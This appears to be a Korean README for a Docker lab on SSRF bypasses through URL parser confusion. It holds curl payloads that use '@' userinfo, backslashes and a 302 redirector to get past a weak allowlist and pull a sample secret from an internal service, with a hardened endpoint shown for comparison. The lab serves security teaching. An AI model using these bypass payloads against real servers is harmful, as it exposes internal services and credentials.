# ssrf-url-parser-confusion

> 블로그 글 실습 환경 레포지토리  
> 관련 글 → [7rueb1rd.tistory.com](https://7rueb1rd.tistory.com/44)

---

## 디렉터리 구조

```
.
├── docker-compose.yml       # 전체 실습 환경 정의
├── Dockerfile.target        # 취약한 타깃 앱 이미지
├── app/
│   └── vuln_app.py          # 취약한 Flask 앱 소스
└── README.md
```

---

## 환경 요구사항

| 항목 | 버전 |
|------|------|
| Docker | 24.0 이상 |
| Docker Compose | v2 이상 (`docker compose` 명령) |
| OS | Linux / macOS / Windows(WSL2) |

---

## 빠른 시작

```bash
# 1. 레포 클론
git clone https://github.com/Truebird0109/sec-lab.git
cd sec-lab/ssrf-url-parser-confusion

# 2. 빌드 & 실행
docker compose up -d --build

# 3. 동작 확인
curl http://localhost:5000/fetch-weak?url=http://httpbin.org/get
```

---

## 컨테이너 구성

```
[외부 / 내 브라우저·curl]
        │
        ▼ :5000
  ┌─────────────┐
  │   target    │  ← 취약한 Flask 앱 (공격 대상)
  └──────┬──────┘
         │ internal 네트워크
         ├──────────────────────────────┐
         ▼                              ▼
  ┌──────────────┐              ┌──────────────────────┐
  │ internal-api │              │ attacker-redirector  │
  │   :8080      │              │   :9000              │
  │ (외부 직접   │              │ (302 → internal-api) │
  │  접근 불가)  │              └──────────────────────┘
  └──────────────┘
```

| 컨테이너 | 포트 | 역할 |
|----------|------|------|
| `target` | 5000 | 취약한 Flask 앱. 공격 대상 |
| `internal-api` | 8080 (내부만) | 외부에서 직접 접근 불가한 비밀 서비스 |
| `attacker-redirector` | 9000 | 302로 internal-api로 리다이렉트하는 공격자 서버 시뮬레이션 |

---

## 실습 명령어 모음

### 기본 동작 확인

```bash
# 정상 차단 확인
curl "http://localhost:5000/fetch-weak?url=http://evil.com/"
# 예상 결과: {"error": "Blocked by WAF"}

# 허용된 도메인 (실제로 없는 도메인이라 연결 오류 발생)
curl "http://localhost:5000/fetch-weak?url=https://images.example.com/"
```

### 실습 1 — `@` (유저인포) Parser Confusion

```bash
# WAF는 netloc에서 images.example.com을 보고 통과시키지만
# requests는 @ 뒤인 localhost:5000으로 접속합니다
curl "http://localhost:5000/fetch-weak?url=https://images.example.com@localhost:5000/internal-secret"

# 예상 결과:
# {"status": 200, "body": "{\"aws_access_key\": \"AKIAIOSFODNN7EXAMPLE\", ...}"}
```

### 실습 2 — 백슬래시(`\`) Parser Confusion

```bash
# urlparse는 netloc에 images.example.com\localhost:5000 전체를 담지만
# urllib3는 백슬래시 앞 images.example.com 으로만 접속을 시도합니다
# (실제 DNS가 없어 오류 — 실전에서는 내 서버 도메인을 사용합니다)
curl "http://localhost:5000/fetch-weak?url=https://images.example.com\\localhost:5000/internal-secret"
```

### 실습 3 — 302 리다이렉트 우회

```bash
# attacker-redirector(9000)는 302로 internal-api(8080)로 리다이렉트합니다
# target이 리다이렉트를 자동으로 따라가면서 내부 서비스 데이터를 반환합니다

# 리다이렉터 동작 확인
curl -v http://localhost:9000/
# → HTTP/1.0 302  Location: http://internal-api:8080/

# @ 트릭으로 WAF 우회 + 리다이렉터 조합
curl "http://localhost:5000/fetch-weak?url=https://images.example.com@localhost:9000/"

# 예상 결과:
# {"status": 200, "body": "{\"access\": \"INTERNAL_ONLY\", ...}"}
```

### 안전한 엔드포인트와 비교

```bash
# /fetch-strong 은 hostname 기반 검증 + allow_redirects=False
# 같은 페이로드를 넣어도 차단됩니다
curl "http://localhost:5000/fetch-strong?url=https://images.example.com@localhost:5000/internal-secret"
# 예상 결과: {"error": "Blocked by WAF"}
```

---

## 실습 후 정리

```bash
docker compose down
```

---

## 주의사항

이 레포의 모든 코드는 **로컬 실습 전용**입니다.  
허가받지 않은 외부 시스템에 사용하는 것은 불법이며, 모든 책임은 사용자에게 있습니다.
